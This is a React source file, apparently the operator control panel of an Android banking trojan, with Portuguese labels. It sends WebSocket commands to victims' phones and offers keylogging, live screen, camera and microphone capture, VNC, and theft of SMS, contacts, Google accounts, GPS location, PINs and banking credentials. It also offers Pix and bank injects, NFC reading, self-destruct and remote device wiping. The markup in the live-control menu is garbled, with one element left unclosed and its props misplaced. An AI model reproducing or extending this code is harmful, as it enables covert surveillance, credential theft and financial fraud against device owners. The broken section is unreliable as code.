import { useState } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';
import LiveScreen     from './LiveScreen.jsx';
import LiveCamera     from './LiveCamera.jsx';
import LiveAudio      from './LiveAudio.jsx';
import AppManager     from './AppManager.jsx';
import DataExtraction from './DataExtraction.jsx';
import Financial      from './Financial.jsx';
import KeylogPanel    from './KeylogPanel.jsx';
import NFCPanel       from './NFCPanel.jsx';
import SecurityPanel  from './SecurityPanel.jsx';
import ScreenReaderV2 from './ScreenReaderV2.jsx';

// FIX BUG 2: removed invalid <{TOAST}/> JSX — Toast is now rendered via a portal div
export default function DeviceDetail({ onBack }) {
  const d          = useStore(s => s.deviceDetail);
  const onlineIds  = useStore(s => s.onlineIds);
  const selectedId = useStore(s => s.selectedId);
  const [activeSection, setActiveSection] = useState(null);
  const [toast, setToast] = useState(null);

  const online   = onlineIds.has(selectedId);
  const ipMasked = (d?.ip_address || '').replace(/(\d+)\.(\d+)\.\d+\.\d+/, '$1.$2.***.***');

  function sendCmd(action, params = {}) {
    ws.send({ type: 'command', device_id: selectedId, action, ...params });
    showToast(`Comando ${action} com sucesso!`);
  }

  function showToast(msg) {
    setToast(msg);
    setTimeout(() => setToast(null), 2500);
  }

  function go(id)  { setActiveSection(id); }
  function back()  {
    if (activeSection) { setActiveSection(null); return; }
    onBack();
  }

  if (!d) return null;

  // Shared props for all sub-sections
  const subProps = { deviceId: selectedId, onBack: back, sendCmd };

  // FIX BUG 2: Toast rendered as a plain sibling div, never as <{TOAST}/>
  const Toast = toast ? (
    <div style={{
      position: 'fixed', top: 76, left: '50%', transform: 'translateX(-50%)',
      background: 'rgba(18,14,4,.97)', border: '1px solid var(--gold)',
      borderRadius: 12, padding: '10px 20px', zIndex: 9999,
      maxWidth: '90vw', textAlign: 'center', pointerEvents: 'none',
    }}>
      <div style={{ color: '#00c864', fontSize: 14, marginBottom: 3 }}>✓</div>
      <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 13 }}>{toast}</div>
    </div>
  ) : null;

  // Sub-section routing — clean conditional render, no dynamic JSX tag names
  if (activeSection === 'screen')    return <>{Toast}<LiveScreen    {...subProps} /></>;
  if (activeSection === 'reader')    return <>{Toast}<ScreenReaderV2  {...subProps} /></>;
  if (activeSection === 'camera')    return <>{Toast}<LiveCamera    {...subProps} /></>;
  if (activeSection === 'audio')     return <>{Toast}<LiveAudio     {...subProps} /></>;
  if (activeSection === 'apps')      return <>{Toast}<AppManager    {...subProps} /></>;
  if (activeSection === 'data')      return <>{Toast}<DataExtraction {...subProps} /></>;
  if (activeSection === 'financial') return <>{Toast}<Financial     {...subProps} /></>;
  if (activeSection === 'keylog')    return <>{Toast}<KeylogPanel   {...subProps} /></>;
  if (activeSection === 'nfc')       return <>{Toast}<NFCPanel      {...subProps} /></>;
  if (activeSection === 'security')  return <>{Toast}<SecurityPanel {...subProps} /></>;

  // Main menu
  return (
    <div className="fade-up">
      {Toast}

      {/* Header */}
      <div className="row-sb mb12">
        <div className="row gap10">
          <div className="dev-item-icon" style={{ width: 38, height: 38, fontSize: 18 }}>📱</div>
          <div>
            <div style={{ fontWeight: 800, fontSize: 15 }}>{d.model || d.device_id}</div>
            <div className="row gap6 mt4">
              <span className={`dot ${online ? 'dot-green' : 'dot-red'}`} />
              <span className="txt-xs" style={{ color: online ? '#00c864' : '#e03060' }}>
                {online ? 'DISPOSITIVO CONECTADO' : 'OFFLINE'}
              </span>
            </div>
          </div>
        </div>
        <button className="btn btn-ghost btn-sm" onClick={back}>← VOLTAR</button>
      </div>

      {/* Device identity card */}
      <div className="card mb12">
        <div className="row gap10">
          <div style={{
            width: 48, height: 48, borderRadius: 12,
            background: 'var(--gold-dim)', border: '1px solid var(--gold-border)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontSize: 24, flexShrink: 0, position: 'relative',
          }}>
            📱
            <span className={`dot ${online ? 'dot-green' : 'dot-dim'}`}
              style={{ position: 'absolute', bottom: 2, right: 2, width: 10, height: 10,
                border: '2px solid var(--card)' }} />
          </div>
          <div className="flex1">
            <div className="row-sb mb6">
              <span style={{ fontWeight: 700, fontSize: 15 }}>{d.model || d.device_id}</span>
              <span className={`pill ${online ? 'pill-green' : 'pill-dim'}`}>
                {online ? '● ONLINE' : '● OFFLINE'}
              </span>
            </div>
            <div className="row gap6">
              <span className="pill pill-gold" style={{ fontSize: 11 }}>● {ipMasked || '—'}</span>
              <span className="pill pill-dim" style={{ fontSize: 11 }}>
                📅 {d.days_since_install || 0} dias
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* BANKS CRYPTER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>💳</span> BANKS CRYPTER</div>
          <span className={`pill ${d.banks_crypter ? 'pill-green' : 'pill-dim'}`}>
            {d.banks_crypter ? 'ON' : 'OFF'}
          </span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb6">Camada criptográfica bancária</div>
          <div className="toggle-wrap" style={{ padding: 0 }}>
            <span className="toggle-label">Ativar ALLBANK</span>
            <div className={`toggle ${d.banks_crypter ? 'on' : ''}`}
              onClick={() => sendCmd('TOGGLE_BOT_OPTION', { option: 'banks_crypter', enabled: !d.banks_crypter })} />
          </div>
        </div>
      </div>

      {/* NFC READER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>📡</span> NFC READER</div>
          <span className="pill pill-green">READY</span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb8">Leitor de proximidade</div>
          <button className="btn btn-blue btn-block" onClick={() => go('nfc')}>📡 START READER</button>
        </div>
      </div>

      {/* OPTIMIZE SERVER */}
      <div className="ctrl-group mb10">
        <div className="ctrl-group-header row-sb">
          <div className="row gap6"><span>⚡</span> OPTIMIZE SERVER</div>
          <span className="pill pill-dim">IDLE</span>
        </div>
        <div className="ctrl-group-body">
          <div className="txt-xs txt-dim mb8">VNC + WebSocket</div>
          <button className="btn btn-gold btn-block" onClick={() => sendCmd('RECONNECT_CONNECTION')}>
            ⚡ OPTIMIZE SERVER
          </button>
        </div>
      </div>

      {/* ⚡ CONTROLE AO VIVO */}
      <div className="section-title mt16"><span className="section-icon">⚡</span>CONTROLE AO VIVO</div>

      <MenuRow icon="📱" label="Informações Gerais"   onClick={() => sendCmd('GET_DEVICE_INFO')} />
      <MenuRow icon="📺" label="Tela ao Vivo"         onClick={() => go('reader')}
      <MenuRow icon="🖥" label="VNC Direto"            onClick={() => go('screen')} />
        badge={d.vnc_active ? 'ATIVO' : null} highlight />
      <MenuRow icon="📷" label="Câmera ao Vivo"       onClick={() => go('camera')}
        badge={d.camera_active ? 'ATIVO' : null} />
      <MenuRow icon="🎤" label="Áudio ao Vivo"        onClick={() => go('audio')}
        badge={d.mic_active ? 'ATIVO' : null} />

      {/* Battery */}
      <div className="ctrl-group mb8">
        <div style={{ padding: '10px 14px' }}>
          <div className="row-sb mb6">
            <div className="row gap6">
              <span>🔋</span>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#d4950a', letterSpacing: 1 }}>ENERGIA</span>
            </div>
            <span style={{ fontSize: 13, fontWeight: 700, color: '#d4950a' }}>{d.battery_level || 0}%</span>
          </div>
          <div className="progress">
            <div className="progress-fill" style={{
              width: `${d.battery_level || 0}%`,
              background: (d.battery_level || 0) > 20 ? '#00c864' : '#e03060',
            }} />
          </div>
          {d.is_charging ? <div className="txt-xs txt-dim mt4">⚡ Carregando</div> : null}
        </div>
      </div>

      <MenuRow icon="🛡" label="SEGURANÇA" badge2="CREDENCIAIS" onClick={() => go('security')} />
      <MenuRow icon="🔒" label="Admin, Lock & PIN"            onClick={() => go('security')} />
      <MenuRow icon="💉" label="Senhas dos injects"               onClick={() => go('financial')} />
      <MenuRow icon="⌨" label="Keylogger"
        badge={d.keylogger_active ? 'ATIVO' : 'false'} onClick={() => go('keylog')} />

      {/* 📁 EXTRAÇÃO DE DADOS */}
      <div className="section-title mt16"><span className="section-icon">📁</span>EXTRAÇÃO DE DADOS</div>
      <MenuRow icon="📧" label="Contas Google"          onClick={() => sendCmd('GET_ACCOUNTS')} />
      <MenuRow icon="💾" label="Extração de Dados"      onClick={() => go('data')} />
      <MenuRow icon="📁" label="Gerenciador de Arquivos" onClick={() => go('data')} />
      <MenuRow icon="💬" label="SMS & Mensagens"    onClick={() => go('data')} />
      <MenuRow icon="📱" label="Aplicativos"            onClick={() => go('apps')} />
      <MenuRow icon="👤" label="Contatos"               onClick={() => go('data')} />
      <MenuRow icon="📍" label="Localização GPS"        onClick={() => sendCmd('GET_LOCATION')} />

      {/* 💰 FINANCEIRO */}
      <div className="section-title mt16"><span className="section-icon">💰</span>FINANCEIRO</div>
      <MenuRow icon="🏦" label="Banking Data"     onClick={() => go('financial')} />
      <MenuRow icon="💳" label="Pix & Inject" onClick={() => go('financial')} />
      <MenuRow icon="🔓" label="Unlock Sequences" onClick={() => go('financial')} />

      {/* System quick buttons */}
      <div className="section-title mt16"><span className="section-icon">⚙</span>Sistema</div>
      <div className="grid g2 mb8">
        {[
          ['◀ BACK','BACK'],['⌂ HOME','HOME'],['⧉ RECENT','RECENTS'],['💡 WAKE','WAKEUP'],
          ['🔔 NOTIF','NOTIFICATIONS'],['⚙ QS','QUICK_SETTINGS'],['📳 VIBRAR','VIBRATE'],
          ['🔒 LOCK','LOCK_DEVICE'],['🖤 BLACK ON','BLACK_SCREEN_ON'],['⬜ BLACK OFF','BLACK_SCREEN_OFF'],
          ['🔦 TORCH','TOGGLE_TORCH'],['👁 HIERARCHY','REQUEST_HIERARCHY'],
        ].map(([label, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{label}</button>
        ))}
        <button className="btn btn-danger-soft btn-sm btn-block"
          onClick={() => { if(confirm('Self destruct?')) sendCmd('SELF_DESTRUCT'); }}>💥 DESTRUCT</button>
        <button className="btn btn-danger-soft btn-sm btn-block"
          onClick={() => { if(confirm('Format device?')) sendCmd('FORMAT_DEVICE'); }}>🗑 FORMAT</button>
      </div>
      <div style={{ height: 24 }} />
    </div>
  );
}

function MenuRow({ icon, label, onClick, badge, badge2, highlight }) {
  return (
    <div onClick={onClick} style={{
      display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
      marginBottom: 6, borderRadius: 10, cursor: 'pointer',
      background: highlight
        ? 'linear-gradient(135deg, rgba(30,60,140,.45), rgba(180,100,20,.25))'
        : 'var(--card2)',
      border: `1px solid ${highlight ? 'rgba(59,122,240,.45)' : 'rgba(212,149,10,.15)'}`,
      transition: 'opacity .15s',
    }}>
      <span style={{ fontSize: 18 }}>{icon}</span>
      <span style={{ flex: 1, fontWeight: 600, fontSize: 14 }}
        dangerouslySetInnerHTML={{ __html: label }} />
      {badge  && <span className="pill pill-gold"  style={{ fontSize: 10 }}>{badge}</span>}
      {badge2 && <span className="pill pill-dim"   style={{ fontSize: 10 }}>{badge2}</span>}
      {highlight && <span className="dot dot-gold" />}
    </div>
  );
}
